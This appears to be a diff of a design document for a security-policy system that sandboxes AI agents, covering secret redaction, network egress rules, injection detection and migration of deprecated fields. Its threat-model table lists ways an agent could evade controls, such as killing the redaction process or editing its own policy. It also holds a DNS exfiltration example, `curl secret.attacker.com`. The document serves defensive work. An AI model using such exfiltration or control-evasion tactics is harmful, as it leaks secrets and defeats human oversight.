@@ -133,7 +133,7 @@ Each feature operates independently. Enabling one does NOT require enabling othe
 
 | Feature | Dependencies | Can standalone? | Runtime requirement |
 |---------|-------------|-----------------|---------------------|
-| Redaction | `redact` binary in image | Yes | Base image (already included) |
+| Redaction | None (proxy layer uses compiled Go regex); `redact` binary for entrypoint layer (already in base image) | Yes | API server (primary) + Base image (secondary) |
 | Network Policy | NetworkPolicy controller (Calico/Cilium) | Yes | Cluster-level |
 | Injection Detection | None (runs in API proxy) | Yes | API server only |
 | PATH Shadowing | `redact` binary + wrapper scripts | Yes | Hardened image variant |
@@ -177,8 +177,13 @@ Each feature operates independently. Enabling one does NOT require enabling othe
 securityPolicy:
   redaction:
     enabled: true
-    # Fail mode when redact binary is missing or crashes
-    failMode: "closed"  # "closed" (block output) | "open" (pass through) | "warn" (pass + log)
+    # Fail mode when redaction encounters an error
+    # Proxy layer: if regex compilation fails or redaction panics, this controls response behavior
+    # Entrypoint layer: if redact binary is missing or crashes, this controls output behavior
+    # "closed" = block output (502 at proxy / exit 1 at entrypoint)
+    # "open" = pass through unredacted
+    # "warn" = pass through + log warning
+    failMode: "closed"
     # Additional regex patterns beyond the 16 built-in rules
     customPatterns:
       - pattern: "PRIVATE-[A-Z0-9]{32}"
@@ -823,16 +828,23 @@ type CreateWorkspaceRequest struct {
 ```go
 type CreateSandboxRequest struct {
     Runtime              string                `json:"runtime"`
-    SecurityLevel        string                `json:"securityLevel,omitempty"` // DEPRECATED
+    SecurityLevel        string                `json:"securityLevel,omitempty"` // DEPRECATED — use SecurityPolicy.Preset
     SecurityPolicy       *SecurityPolicy       `json:"securityPolicy,omitempty"` // NEW (workspace-level)
     SecurityPolicyOverride *SecurityPolicyOverride `json:"securityPolicyOverride,omitempty"` // NEW (sandbox-level)
     Timeout              int                   `json:"timeout,omitempty"`
     UserID               string                `json:"userId"`
     Resources            *ResourceRequirements `json:"resources,omitempty"`
-    NetworkAccess        *NetworkAccess        `json:"networkAccess,omitempty"`
+    NetworkAccess        *NetworkAccess        `json:"networkAccess,omitempty"` // DEPRECATED — use SecurityPolicy.Network
     WorkspaceRef         string                `json:"workspaceRef,omitempty"`
 }
 ```
+
+**Field overlap resolution:** The existing `NetworkAccess` field on the Workspace CRD (§5.1 of workspace_crd.yaml) and `CreateSandboxRequest` overlaps with `securityPolicy.network`. During migration:
+
+- If only `networkAccess` is set (no `securityPolicy.network`): treated as `securityPolicy.network.allowedDomains` with `denyByDefault: false` (backwards-compatible — existing behavior is allowlist-additive, not deny-by-default)
+- If only `securityPolicy.network` is set: used as-is
+- If both are set: validation rejects with "Cannot use both networkAccess (deprecated) and securityPolicy.network"
+- `networkAccess` follows the same 3-phase deprecation as `securityLevel` (§12.2)
 
 ### 6.3 SecurityPolicy Go Types
 
@@ -1079,10 +1091,19 @@ Domain resolution runs in a background goroutine (5-minute refresh). Stale IPs a
 
 ### 7.6 Condition Reporting
 
-The controller reports security policy status via conditions:
+The controller reports security policy status via conditions and stores the resolved policy in CRD status for proxy consumption:
 
 ```yaml
 status:
+  # Machine-readable resolved policy — used by the API proxy for redaction and injection detection
+  resolvedSecurityPolicy:
+    redaction:
+      enabled: true
+      failMode: "closed"
+    injectionDetection:
+      enabled: true
+      action: "log"
+    # Only redaction + injection fields needed by proxy; network/pathShadowing/admission are controller-only
   conditions:
     - type: SecurityPolicyApplied
       status: "True"
@@ -1097,6 +1118,8 @@ status:
       reason: "KyvernoNotInstalled"
       message: "Kyverno CRD not found in cluster; admission enforcement disabled"
 ```
+
+The `status.resolvedSecurityPolicy` field contains only the subset of the policy relevant to the API proxy (redaction config + injection detection config). The proxy already loads the Sandbox CRD via `sandboxOwnershipMiddleware` — it reads the resolved policy from this field. This avoids a second lookup and keeps the proxy stateless.
 
 ---
 
@@ -1344,8 +1367,8 @@ Custom regex patterns (redaction and injection) are compiled at validation time:
 | Invalid regex in `customPatterns[].pattern` | "Invalid regex in customPatterns[{index}]: {compile error}" |
 | Pattern name conflicts with built-in | "Pattern name '{name}' conflicts with built-in rule. Choose a different name." |
 | Pattern name empty or > 64 chars | "Pattern name must be 1-64 characters" |
-| Pattern exhibits catastrophic backtracking (ReDoS) | "Pattern in customPatterns[{index}] is vulnerable to ReDoS: {detail}. Simplify the pattern." |
-| Pattern exceeds compile-time budget (>100ms to compile) | "Pattern in customPatterns[{index}] is too complex (compile timeout). Simplify the pattern." |
+| Pattern exhibits catastrophic backtracking (ReDoS) | N/A — Go's RE2 engine is immune to ReDoS. This row retained for documentation: no runtime timeout needed. |
+| Pattern exceeds AST complexity limit (>1000 nodes) | "Pattern in customPatterns[{index}] is too complex (1000 node limit). Simplify the pattern." |
 
 **Pattern safety:** Go's `regexp` package uses RE2/Thompson NFA semantics — it guarantees linear-time matching and is immune to catastrophic backtracking by design. However, complex patterns still have high constant factors and can be slow on large inputs. Mitigations:
 
@@ -1469,7 +1492,7 @@ groups:
 | Agent modifies its own security policy | Config Delivery | Policy file written by init container via ConfigMap; read-only mount in main container |
 | Agent disables redaction by killing the process | Redaction failMode | `failMode: closed` blocks all output if redact is unavailable |
 | DNS-based data exfiltration | Audit (verbose) + Network Policy | Agent encodes secrets in DNS queries (e.g., `curl secret.attacker.com`). Mitigation: DNS query logging at verbose audit level; network policy limits which domains resolve; rate limiting at CoreDNS level (operator responsibility) |
-| ReDoS via malicious custom patterns | Pattern Validation (§11.3) | Static AST analysis rejects nested quantifiers; runtime 100ms timeout per pattern; complexity limit of 1000 AST nodes |
+| ReDoS via malicious custom patterns | Pattern Validation (§11.3) | Go RE2 guarantees linear-time matching; AST complexity limit (1000 nodes) rejects pathologically slow patterns; input size limit (1 MiB) bounds processing time; max 20 custom patterns per workspace |
 | Credential leakage via allowed domains | Redaction (proxy layer) | Even when egress is allowed to a domain, the proxy redacts secrets from the response body before the client sees it. Does NOT prevent the agent from sending secrets TO the allowed domain (see §14.2). |
 
 ### 14.2 Threats NOT Addressed (Out of Scope)
